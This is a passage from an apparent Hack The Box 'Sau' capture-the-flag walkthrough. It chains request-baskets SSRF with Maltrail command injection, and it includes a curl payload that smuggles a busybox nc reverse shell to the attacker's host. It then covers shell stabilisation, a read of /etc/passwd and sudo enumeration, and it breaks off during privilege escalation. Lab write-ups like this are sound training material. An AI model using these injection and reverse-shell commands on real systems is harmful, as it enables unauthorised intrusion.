<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ curl http://10.10.11.224:55555/3gu14de -d &#39;username=;`curl 10.10.14.155`&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>After a moment of waiting, we can see a request was sent to our listener!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ nc -lp 80
</span></span><span class="line"><span class="cl">GET / HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 10.10.14.155
</span></span><span class="line"><span class="cl">User-Agent: curl/7.68.0
</span></span><span class="line"><span class="cl">Accept: */*
</span></span></code></pre></td></tr></table>
</div>
</div><p>The user-agent is curl as expected, and very importantly the host is <code>10.10.14.155</code>, our victim&rsquo;s IP.</p>
<h3 id="chain-exploiting-request-baskets-ssrf-and-maltrails-command-injection-for-rce">Chain exploiting request-basket&rsquo;s SSRF and Maltrail&rsquo;s Command Injection for RCE
</h3><p>Now to generate a reverse shell. For this, I used the busybox nc payload from <a class="link" href="https://www.revshells.com/"  target="_blank" rel="noopener"
    >revshells</a>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ curl http://10.10.11.224:55555/3gu14de -d &#39;username=;`busybox nc 10.10.14.155 8888 -e bash`&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Meanwhile on my nc listener:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ nc -nvlp 8888
</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
</span></span><span class="line"><span class="cl">connect to [10.10.14.155] from (UNKNOWN) [10.10.11.224] 34052
</span></span><span class="line"><span class="cl">id                                                                                                                  
</span></span><span class="line"><span class="cl">uid=1001(puma) gid=1001(puma) groups=1001(puma)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation">Privilege Escalation
</h2><h3 id="stabilizing-reverse-shell">Stabilizing reverse shell
</h3><p>Currently, the reverse shell has limited capabilities. We can improve the stability with <code>script</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">script -qc /bin/bash /dev/null
</span></span></code></pre></td></tr></table>
</div>
</div><p>Afterwards, we must reconfigure stty from our kali terminal. Using ctrl+Z will send the reverse shell to background, were we can configure stty.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">puma@sau:/opt/maltrail$ ^Z                                                                                          
</span></span><span class="line"><span class="cl">zsh: suspended  nc -nvlp 8888                                                                                       
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ stty raw -echo; fg                               
</span></span><span class="line"><span class="cl">[1]  + continued  nc -nvlp 8888
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">puma@sau:/opt/maltrail$
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>fg</code> returns the reverse shell to foreground, and now we have a stable, interactive session on the victim host.</p>
<h3 id="checking-for-additional-users-on-the-system">Checking for additional users on the system
</h3><p>We can see that we are user <code>puma</code>, and notably user 1001. Since user creations typically start with number 1000, there is likely another created user on the system. We can figure this out by checking /etc/passwd:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">puma</span><span class="err">@</span><span class="n">sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="o">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
</span></span><span class="line"><span class="cl"><span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
</span></span><span class="line"><span class="cl"><span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
</span></span><span class="line"><span class="cl"><span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="n">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Time</span> <span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">106</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">syslog</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">110</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">tss</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="n">TPM</span> <span class="n">software</span> <span class="n">stack</span><span class="p">,,,:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">tpm</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
</span></span><span class="line"><span class="cl"><span class="n">uuidd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">112</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">tcpdump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">113</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">109</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">landscape</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="mi">115</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">landscape</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">pollinate</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="mi">1</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
</span></span><span class="line"><span class="cl"><span class="n">fwupd</span><span class="o">-</span><span class="n">refresh</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">112</span><span class="p">:</span><span class="mi">116</span><span class="p">:</span><span class="n">fwupd</span><span class="o">-</span><span class="n">refresh</span> <span class="n">user</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Core</span> <span class="n">Dumper</span><span class="p">:</span><span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
</span></span><span class="line"><span class="cl"><span class="n">lxd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">998</span><span class="p">:</span><span class="mi">100</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">lxd</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">lxd</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
</span></span><span class="line"><span class="cl"><span class="n">puma</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">puma</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
</span></span><span class="line"><span class="cl"><span class="n">_laurel</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">997</span><span class="p">:</span><span class="mi">997</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">laurel</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Unexpectedly, there is no user with id number 1000. Considering this is an easy difficulty box, the likely conclusion is that lateral movement won&rsquo;t be necessary for completion.</p>
<h3 id="checking-sudo-privileges">Checking sudo privileges
</h3><p>Enumerating our sudo authorization, we can see our user <code>puma</code> has some command allowances without requiring a password:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">puma@sau:/opt/maltrail$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for puma on sau:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User puma may run the following commands on sau:
</span></span><span class="line"><span class="cl">    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is very good for us, considering we don&rsquo;t know puma&rsquo;s password currently.</p>
<h3 id="abusing-priveleged-less-session-to-spawn-a-root-shell">Abusing priveleged less session to spawn a root shell
</h3><p>Trying out the command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">puma</span><span class="err">@</span><span class="n">sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="o">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">systemctl</span> <span class="n">status</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span>
</span></span><span class="line"><span class="cl"><span class="n">WARNING</span><span class="p">:</span> <span class="n">terminal</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">fully</span> <span class="n">functional</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>  <span class="p">(</span><span class="n">press</span> <span class="n">RETURN</span><span class="p">)</span><span class="err">‚óè</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span> <span class="o">-</span> <span class="n">Maltrail</span><span class="o">.</span> <span class="n">Server</span> <span class="n">of</span> <span class="n">malicious</span> <span class="n">traffic</span> <span class="n">detection</span> <span class="n">system</span>
</span></span><span class="line"><span class="cl">     <span class="n">Loaded</span><span class="p">:</span> <span class="n">loaded</span> <span class="p">(</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">trail</span><span class="o">.</span><span class="n">service</span><span class="p">;</span> <span class="n">enabled</span><span class="p">;</span> <span class="n">vendor</span> <span class="n">preset</span><span class="p">:</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">     <span class="n">Active</span><span class="p">:</span> <span class="n">active</span> <span class="p">(</span><span class="n">running</span><span class="p">)</span> <span class="n">since</span> <span class="n">Fri</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">05</span> <span class="mi">16</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">06</span> <span class="n">UTC</span><span class="p">;</span> <span class="mi">2</span><span class="n">h</span> <span class="mi">0</span><span class="nb">min</span> <span class="n">ago</span>
</span></span><span class="line"><span class="cl">       <span class="n">Docs</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">stamparm</span><span class="o">/</span><span class="n">maltrail</span><span class="c1">#readme</span>
</span></span><span class="line"><span class="cl">             <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">stamparm</span><span class="o">/</span><span class="n">maltrail</span><span class="o">/</span><span class="n">wiki</span>
</span></span><span class="line"><span class="cl">   <span class="n">Main</span> <span class="n">PID</span><span class="p">:</span> <span class="mi">895</span> <span class="p">(</span><span class="n">python3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">Tasks</span><span class="p">:</span> <span class="mi">62</span> <span class="p">(</span><span class="n">limit</span><span class="p">:</span> <span class="mi">4662</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">     <span class="n">Memory</span><span class="p">:</span> <span class="mf">80.7</span><span class="n">M</span>
</span></span><span class="line"><span class="cl">     <span class="n">CGroup</span><span class="p">:</span> <span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">trail</span><span class="o">.</span><span class="n">service</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span> <span class="mi">895</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">python3</span> <span class="n">server</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span> <span class="mi">986</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">logger</span> <span class="o">-</span><span class="n">p</span> <span class="n">auth</span><span class="o">.</span><span class="n">info</span> <span class="o">-</span><span class="n">t</span> <span class="s2">&#34;maltrail[895]&#34;</span> <span class="s2">&#34;Failed p&gt;</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span> <span class="mi">989</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">logger</span> <span class="o">-</span><span class="n">p</span> <span class="n">auth</span><span class="o">.</span><span class="n">info</span> <span class="o">-</span><span class="n">t</span> <span class="s2">&#34;maltrail[895]&#34;</span> <span class="s2">&#34;Failed p&gt;</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span> <span class="mi">995</span> <span class="n">sh</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span> <span class="mi">997</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="n">import</span> <span class="n">socket</span><span class="p">,</span><span class="n">os</span><span class="p">,</span><span class="n">pty</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_I</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">             <span class="err">‚îú‚îÄ</span> <span class="mi">998</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
